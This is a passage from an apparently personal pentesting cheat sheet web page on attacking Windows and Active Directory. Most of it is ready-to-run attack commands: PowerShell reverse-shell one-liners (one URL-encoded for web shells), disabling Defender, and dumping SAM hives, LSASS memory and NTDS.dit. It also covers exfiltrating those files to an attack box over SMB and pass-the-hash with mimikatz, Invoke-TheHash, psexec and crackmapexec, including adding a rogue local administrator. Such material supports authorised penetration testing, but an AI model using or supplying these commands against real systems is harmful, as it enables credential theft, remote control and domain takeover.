</span><span class="nv">$search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">DirectoryServices.DirectorySearcher</span><span class="p">([</span><span class="n">ADSI</span><span class="p">]</span><span class="s2">""</span><span class="p">);</span><span class="w"> </span><span class="nv">$search</span><span class="o">.</span><span class="nf">filter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"</span><span class="p">;</span><span class="w"> </span><span class="nv">$results</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$search</span><span class="o">.</span><span class="nf">Findall</span><span class="p">();</span><span class="w"> </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$result</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$results</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$userEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$result</span><span class="o">.</span><span class="nf">GetDirectoryEntry</span><span class="p">();</span><span class="w"> </span><span class="n">Write-host</span><span class="w"> </span><span class="s2">"User : "</span><span class="w"> </span><span class="nv">$userEntry</span><span class="o">.</span><span class="nf">name</span><span class="w"> </span><span class="s2">"("</span><span class="w"> </span><span class="nv">$userEntry</span><span class="o">.</span><span class="nf">distinguishedName</span><span class="w"> </span><span class="s2">")"</span><span class="p">;</span><span class="w"> </span><span class="n">Write-host</span><span class="w"> </span><span class="s2">"SPNs"</span><span class="p">;</span><span class="w"> </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$SPN</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$userEntry</span><span class="o">.</span><span class="nf">servicePrincipalName</span><span class="p">){</span><span class="nv">$SPN</span><span class="p">;}</span><span class="w"> </span><span class="n">Write-host</span><span class="w"> </span><span class="s2">""</span><span class="p">;}</span><span class="w">

</span><span class="c">################</span><span class="w">
</span><span class="c"># other methods from your attack box</span><span class="w">
</span><span class="c">################</span><span class="w">

</span><span class="c"># check for null and guest access on smb services from your attack box</span><span class="w">
</span><span class="n">enum4linux</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">enum4linux</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"guest"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w">
</span><span class="n">smbmap</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nt">-P</span><span class="w"> </span><span class="nx">445</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">smbmap</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"guest"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nt">-P</span><span class="w"> </span><span class="nx">445</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w">
</span><span class="n">smbclient</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="s1">'%'</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="nx">//</span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">smbclient</span><span class="w"> </span><span class="nt">-U</span><span class="w"> </span><span class="s1">'guest%'</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="nx">//</span><span class="w">

</span><span class="c"># download all files from a share</span><span class="w">
</span><span class="c"># will stop and might not download everything in case of permission errors</span><span class="w">
</span><span class="n">smbget</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">smb://</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">share_name</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># another way to download everything with smbclient</span><span class="w">
</span><span class="n">smbclient</span><span class="w"> </span><span class="s2">"\\server\share"</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="c"># connect to the share</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mask</span><span class="w"> </span><span class="s2">""</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">recurse</span><span class="w"> </span><span class="nx">ON</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">prompt</span><span class="w"> </span><span class="nx">OFF</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lcd</span><span class="w"> </span><span class="s2">"&lt;attack_box_download_path&gt;"</span><span class="w">
</span><span class="n">smb:</span><span class="w"> </span><span class="nx">\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mget</span><span class="w"> </span><span class="o">*</span><span class="w">

</span><span class="c"># enumerate LDAP with nmap</span><span class="w">
</span><span class="n">nmap</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nt">-sV</span><span class="w"> </span><span class="nt">--script</span><span class="w"> </span><span class="s2">"ldap* and not brute"</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">389</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">DC</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> 
</span></code></pre></div>

<h3>sharphound / bloodhound</h3>

<p>be careful to use matching versions of sharphound + bloodhound, otherwise the results might not be shown.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># collect data with sharphound</span><span class="w">
</span><span class="n">Sharphound.exe</span><span class="w"> </span><span class="nt">--CollectionMethods</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">methods</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--ExcludeDCs</span><span class="w">

</span><span class="c"># grab the resulting .zip and setup bloodhound on your attack box</span><span class="w">
</span><span class="n">neo4j</span><span class="w"> </span><span class="nx">console</span><span class="w"> </span><span class="nx">start</span><span class="w">

</span><span class="c"># run bloodhound in another shell, default credentials are neo4j:neo4j</span><span class="w">
</span><span class="n">bloodHound</span><span class="w"> </span><span class="nt">--use-gl</span><span class="o">=</span><span class="n">egl</span><span class="w"> </span><span class="c"># flag needed for X11 forwarding</span><span class="w">

</span><span class="c"># drag &amp; drop the .zip from sharphound and start exploring graphs</span><span class="w">

</span><span class="c"># check in bloodhound if a machine account has admin access over another machine</span><span class="w">
</span><span class="c"># use "create custom query" in the analysis tab for this</span><span class="w">
</span><span class="n">MATCH</span><span class="w"> </span><span class="nx">p</span><span class="o">=</span><span class="p">(</span><span class="n">c1:Computer</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="o">*</span><span class="mi">1</span><span class="o">..</span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="p">(</span><span class="n">g:Group</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">r2</span><span class="p">:</span><span class="n">AdminTo</span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="p">(</span><span class="n">n:Computer</span><span class="p">)</span><span class="w"> </span><span class="nx">RETURN</span><span class="w"> </span><span class="nx">p</span><span class="w">
</span></code></pre></div>

<h2>exploitation / post-exploitation</h2>

<h3>reverse shells</h3>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># if needed, disable antivirus as admin</span><span class="w">
</span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">

</span><span class="c"># one-liner powershell reverse shell</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">

</span><span class="c"># another reverse shell that seems more reliable</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);</span><span class="nv">$s</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$b</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$s</span><span class="s2">.Read(</span><span class="nv">$b</span><span class="s2">, 0, </span><span class="nv">$b</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$b</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sb</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sb2</span><span class="s2"> = </span><span class="nv">$sb</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sbt</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sb2</span><span class="s2">);</span><span class="nv">$s</span><span class="s2">.Write(</span><span class="nv">$sbt</span><span class="s2">,0,</span><span class="nv">$sbt</span><span class="s2">.Length);</span><span class="nv">$s</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span><span class="w">

</span><span class="c"># URL encoded one-liner for web shells</span><span class="w">
</span><span class="n">powershell</span><span class="o">%</span><span class="nx">20-c</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">22</span><span class="o">%</span><span class="nx">24client</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20New-Object</span><span class="o">%</span><span class="nx">20System.Net.Sockets.TCPClient</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">27</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">2C</span><span class="err">&lt;</span><span class="nx">PORT</span><span class="err">&gt;</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24stream</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24client.GetStream</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">5Bbyte</span><span class="o">%</span><span class="nx">5B</span><span class="o">%</span><span class="nx">5D</span><span class="o">%</span><span class="nx">5D</span><span class="o">%</span><span class="nx">24bytes</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">200..65535</span><span class="o">%</span><span class="nx">7C</span><span class="o">%</span><span class="nx">25</span><span class="o">%</span><span class="nx">7B0</span><span class="o">%</span><span class="nx">7D</span><span class="o">%</span><span class="nx">3Bwhile</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24i</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24stream.Read</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24bytes</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">200</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24bytes.Length</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">20-ne</span><span class="o">%</span><span class="nx">200</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">7B</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24data</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28New-Object</span><span class="o">%</span><span class="nx">20-TypeName</span><span class="o">%</span><span class="nx">20System.Text.ASCIIEncoding</span><span class="o">%</span><span class="nx">29.GetString</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24bytes</span><span class="o">%</span><span class="nx">2C0</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24i</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24sendback</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28iex</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24data</span><span class="o">%</span><span class="nx">202</span><span class="o">%</span><span class="nx">3E</span><span class="o">%</span><span class="nx">261</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">7C</span><span class="o">%</span><span class="nx">20Out-String</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24sendback2</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">24sendback</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">2B</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27PS</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">2B</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28pwd</span><span class="o">%</span><span class="nx">29.Path</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">2B</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">3E</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">27</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24sendbyte</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">3D</span><span class="o">%</span><span class="nx">20</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">5Btext.encoding</span><span class="o">%</span><span class="nx">5D</span><span class="o">%</span><span class="nx">3A</span><span class="o">%</span><span class="nx">3AASCII</span><span class="o">%</span><span class="nx">29.GetBytes</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24sendback2</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24stream.Write</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">24sendbyte</span><span class="o">%</span><span class="nx">2C0</span><span class="o">%</span><span class="nx">2C</span><span class="o">%</span><span class="nx">24sendbyte.Length</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24stream.Flush</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">7D</span><span class="o">%</span><span class="nx">3B</span><span class="o">%</span><span class="nx">24client.Close</span><span class="o">%</span><span class="nx">28</span><span class="o">%</span><span class="nx">29</span><span class="o">%</span><span class="nx">22</span><span class="w">
</span></code></pre></div>

<h3>grab SAM registry hives and dump related hashes</h3>

<p>three SAM registry hives are useful to crack the hashes they contain:</p>

<table><thead>
<tr>
<th>registry hive</th>
<th>description</th>
</tr>
</thead><tbody>
<tr>
<td><code>hklm\sam</code></td>
<td>contains hashes associated with local account passwords</td>
</tr>
<tr>
<td><code>hklm\system</code></td>
<td>contains the system bootkey which is needed to decrypt SAM database</td>
</tr>
<tr>
<td><code>hklm\security</code></td>
<td>optional but useful: contains cached creds for domain accounts</td>
</tr>
</tbody></table>

<p>if you have access to cmd.exe as admin, you can extract them with the following commands:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\sam</span><span class="w"> </span><span class="nx">C:\sam.save</span><span class="w">
</span><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\system</span><span class="w"> </span><span class="nx">C:\system.save</span><span class="w">
</span><span class="n">reg.exe</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">hklm\security</span><span class="w"> </span><span class="nx">C:\security.save</span><span class="w">
</span></code></pre></div>

<p>to transfer them to our attack box, use <code>smbserver.py</code>:</p>

<div class="highlight"><pre class="highlight shell"><code>smbserver.py <span class="nt">-smb2support</span> &lt;share name&gt; &lt;share path&gt;
</code></pre></div>

<p>then, back on our target:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">move</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="o">.</span><span class="nf">save</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">share</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>use secretsdump.py with your transferred registry hives to dump the hashes:</p>

<div class="highlight"><pre class="highlight shell"><code>secretsdump.py <span class="nt">-sam</span> sam.save <span class="nt">-security</span> security.save <span class="nt">-system</span> system.save LOCAL
</code></pre></div>

<p>you can then use hashcat to crack them (use <code>-m 1000</code> for NT hashes), or john.</p>

<p>for an automated and remote way to extract the hashes, see <a href="https://ovelny.sh/chaos/tool-cheat-sheets/crackmapexec/" rel="nofollow">crackmapexec page</a>.</p>

<h3>dump LSASS process memory and dump related hashes</h3>

<p>there are several ways to create a dump file of the LSASS process memory:</p>

<p>if you have access to a GUI (RDP etc), you can open the task manager -&gt; select the processes tab -&gt; right-click on <code>Local Security Authority Process</code> -&gt; click on <code>Create dump file</code>, which will get stored in <code>C:\Users\&lt;current user&gt;\AppData\Local\Temp\lsass.dmp</code>.</p>

<p>if you have only access to a CLI:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># find lsass.exe's PID:</span><span class="w">
</span><span class="c"># with cmd.exe</span><span class="w">
</span><span class="n">tasklist</span><span class="w"> </span><span class="nx">/svc</span><span class="w">

</span><span class="c"># with powershell</span><span class="w">
</span><span class="n">Get-Process</span><span class="w"> </span><span class="nx">lsass</span><span class="w">

</span><span class="c"># create a dump file from an elevated powershell session</span><span class="w">
</span><span class="n">rundll32</span><span class="w"> </span><span class="nx">C:\windows\system32\comsvcs.dll</span><span class="p">,</span><span class="w"> </span><span class="nx">MiniDump</span><span class="w"> </span><span class="nx">672</span><span class="w"> </span><span class="nx">C:\lsass.dmp</span><span class="w"> </span><span class="nx">full</span><span class="w">
</span></code></pre></div>

<p>you can then transfer the dump file with various methods like the one seen earlier. on your attack box, <code>pypykatz</code> can be used to dump the hashes:</p>

<div class="highlight"><pre class="highlight shell"><code>pypykatz lsa minidump lsass.dmp 
</code></pre></div>

<p>the hashes can then be cracked with hashcat or john.</p>

<p>for an automated and remote way to extract the hashes, see <a href="https://ovelny.sh/chaos/tool-cheat-sheets/lsassy/" rel="nofollow">lsassy page</a>.</p>

<h3>grab NTDS.dit and dump related hashes</h3>

<p>if a system is joined to a domain and therefore where AD is present, we can attempt to grab the <code>NTDS.dit</code> file which is a database containing all domain usernames, hashes and schema information. every account on the domain can be compromised if we get our hands on it, but this requires access to a local admin and/or domain admin account.</p>

<p>to check the privileges of the user account you&#39;re connected to, connect to the target and use the following:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># connect with evil-winrm</span><span class="w">
</span><span class="n">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">password</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># check local group membership</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w">

</span><span class="c"># check user privileges</span><span class="w">
</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>if the last command displays the <code>domain admins</code> or the <code>administrators</code> group, we can proceed. first, let&#39;s create a shadow copy of C: (by default), or the volume where AD has been installed:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">vssadmin</span><span class="w"> </span><span class="nx">CREATE</span><span class="w"> </span><span class="nx">SHADOW</span><span class="w"> </span><span class="nx">/For</span><span class="o">=</span><span class="n">C:</span><span class="w">
</span></code></pre></div>

<p>take note of the <code>shadow copy volume name</code> and copy the <code>NTDS.dit</code> file from the shadow copy to another location:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">c:\NTDS\NTDS.dit</span><span class="w">
</span></code></pre></div>

<p>you can then transfer that copy to the attack box with <code>smbserver.py</code> like described earlier, and crack the hashes it contains with hashcat or john.</p>

<p>for an automated and remote way to extract the hashes, see <a href="https://ovelny.sh/chaos/tool-cheat-sheets/crackmapexec/" rel="nofollow">crackmapexec page</a>.</p>

<p>what if we can&#39;t crack the hashes? pass-the-hash attacks might still work, using them directly instead of finding the cleartext passwords:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># evil-winrm with pass-the-hash</span><span class="w">
</span><span class="n">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h3>pass-the-hash attacks</h3>

<p>if NTLM is used for authentication, we can use pass-the-hash attacks and don&#39;t need to find the underlying passwords.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># with mimikatz</span><span class="w">
</span><span class="n">mimikatz.exe</span><span class="w"> </span><span class="nx">privilege::debug</span><span class="w"> </span><span class="s2">"sekurlsa::pth /user:&lt;user&gt; /rc4:&lt;hash&gt; /domain:&lt;domain name&gt; /run:cmd.exe"</span><span class="w"> </span><span class="nx">exit</span><span class="w">

</span><span class="c"># with invoke-thehash: https://github.com/Kevin-Robertson/Invoke-TheHash</span><span class="w">
</span><span class="c"># this example uses PtH to create a user and add it to the local admins group</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\tools\Invoke-TheHash\</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-TheHash.psd1</span><span class="w">
</span><span class="n">Invoke-SMBExec</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Hash</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"net user &lt;username&gt; &lt;password&gt; /add &amp;&amp; net localgroup administrators &lt;username&gt; /add"</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># with invoke-wmiexec from invoke-thehash repo</span><span class="w">
</span><span class="c"># this example executes an encoded reverse shell</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-TheHash.psd1</span><span class="w">
</span><span class="n">Invoke-WMIExec</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">domain</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Username</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Hash</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"powershell -e &lt;encoded reverse shell&gt;"</span><span class="w">
</span></code></pre></div>

<p>from our attack box, impacket, crackmapexec and evil-winrm (as shown earlier) are also available:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># with impacket-psexec</span>
<span class="c"># mind the colon with the hash</span>
impacket-psexec &lt;username&gt;@&lt;IP address&gt; <span class="nt">-hashes</span> :&lt;<span class="nb">hash</span><span class="o">&gt;</span>

<span class="c"># with crackmapexec</span>
cme smb &lt;IP address&gt;/24 <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> <span class="nb">.</span> <span class="nt">-H</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">-x</span> <span class="nb">whoami</span>

<span class="c"># with evil-winrm</span>
evil-winrm <span class="nt">-i</span> &lt;target IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-H</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span>
</code></pre></div>

<p>we can also use pass-the-hash attacks with <code>xfreerdp</code> for GUI access, but this requires restricted admin mode to be enabled on the target. if it&#39;s not, it can be added with the following command:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">HKLM\System\CurrentControlSet\Control\Lsa</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">DisableRestrictedAdmin</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">0x0</span><span class="w"> </span><span class="nx">/f</span><span class="w">
</span></code></pre></div>

